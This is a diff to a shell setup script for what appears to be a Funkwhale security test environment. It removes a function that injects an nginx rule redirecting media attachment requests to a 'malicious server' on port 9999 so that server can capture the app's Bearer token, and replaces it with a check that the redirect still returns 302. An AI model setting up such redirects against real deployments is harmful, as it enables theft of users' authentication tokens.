@@ -234,50 +234,18 @@ print(f'Created placeholder: {cover_path} ({len(png)} bytes)')
 " || log_warn "Failed to create placeholder cover art"
 }
 
-inject_nginx_redirect() {
-    log_info "Injecting nginx redirect for media attachments..."
+verify_nginx_redirect() {
+    log_info "Verifying nginx redirect for media attachments..."
 
-    # Inject nginx redirect rule so that any request to /media/attachments/*
-    # gets 302-redirected to our malicious server on port 9999.
-    # The app fetches cover art -> nginx redirects -> malicious server captures Bearer token.
-    local redirect_url="http://10.0.2.2:9999/malicious.png"
-
-    docker exec front sh -c "
-        # Find the active nginx config
-        CONF=''
-        for f in /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/funkwhale.conf; do
-            if [ -f \"\$f\" ]; then CONF=\"\$f\"; break; fi
-        done
-        if [ -z \"\$CONF\" ]; then
-            echo 'ERROR: No nginx config found'
-            exit 1
-        fi
-        echo \"Using nginx config: \$CONF\"
-
-        if grep -q 'media/attachments' \"\$CONF\" 2>/dev/null; then
-            echo 'Nginx redirect already present'
-        else
-            # Insert redirect block before the existing /media/ location
-            sed -i '/location \/media\//i \\
-    location /media/attachments/ {\\
-        return 302 ${redirect_url};\\
-    }' \"\$CONF\"
-            nginx -s reload
-            echo 'Nginx redirect injected and reloaded'
-        fi
-
-        # Verify the redirect is in place
-        echo '--- Nginx config snippet ---'
-        grep -A2 'media/attachments' \"\$CONF\" || echo 'WARNING: redirect not found in config'
-        echo '--- End snippet ---'
-    " || log_warn "Failed to inject nginx redirect"
-
-    # Verify redirect works from the host
+    # The redirect is baked into nginx.conf template.
+    # Just verify it's working after the containers are up.
     local redirect_check
     redirect_check=$(curl -sk -o /dev/null -w "%{http_code}" "https://localhost/media/attachments/test.png" 2>/dev/null) || true
     log_info "Nginx redirect test: GET /media/attachments/test.png -> HTTP $redirect_check (expect 302)"
 
-    log_info "Nginx redirect injection completed"
+    if [ "$redirect_check" != "302" ]; then
+        log_warn "Nginx redirect not returning 302 — cover art exploit may not work"
+    fi
 }
 
 main(){
@@ -291,7 +259,7 @@ main(){
     # We just need to create the placeholder PNG (media volume is ephemeral)
     # and inject the nginx redirect to route cover art requests to our malicious server.
     create_cover_art_placeholder
-    inject_nginx_redirect
+    verify_nginx_redirect
 
     log_info "Funkwhale server + app setup completed successfully!"
 }
